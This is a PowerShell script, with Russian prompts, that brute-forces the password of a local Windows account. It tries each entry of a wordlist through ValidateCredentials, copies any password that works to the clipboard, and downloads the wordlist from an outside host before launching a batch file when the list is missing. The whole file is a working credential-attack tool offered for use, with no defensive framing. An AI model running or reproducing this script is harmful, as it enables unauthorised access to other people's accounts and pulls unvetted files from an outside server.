Clear-Host
$host.ui.RawUI.WindowTitle = "Extended Y Password BruteForcer"

Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$t = [DirectoryServices.AccountManagement.ContextType]::Machine
$a = [DirectoryServices.AccountManagement.PrincipalContext]::new($t)

function Try-Password($p){
    if($a.ValidateCredentials($u, $p)){
        Write-Output ""
        Write-Output "Пароль найден!"
        Write-Output "Пароль от пользователя ${u}: $p"
        Set-Clipboard -Value "$p"
        Read-Host
        exit
    }else{
        Write-Output "Пароль `"$p`" не подходит."
    }
}

$u = Read-Host "Имя пользователя"
$minl = [int](Read-Host "Мин. длина пароля")
$maxl = [int](Read-host "Макс. длина пароля")
Write-Output ""

Try{
    Write-Output "Чтение файла PWLIST.TXT..."
    Write-Output ""
    [System.IO.File]::ReadLines("./pwlist.txt") | ForEach-Object { if(($_.Length -gt $minl) -and ($_.Length -lt $maxl)){Try-Password($_)} }

}Catch [System.Exception]{
    Write-Output "Файл PWLIST.TXT не найден."
    Write-Output "Скачивание файла..."
    Try{
        $client = New-Object System.Net.WebClient
        $client.DownloadFile("http://f0615718.xsph.ru/ProgramData/pwlist.txt", "./pwlist.txt")
        Write-Output "Файл PWLIST.TXT скачан."
        Start-Process "launcher.bat"
        exit
    }Catch [System.Exception]{
        Write-Output "Не удается скачать файл. Проверьте подключение к Интернету."
        exit
    }
    Write-Output ""
}

Read-Host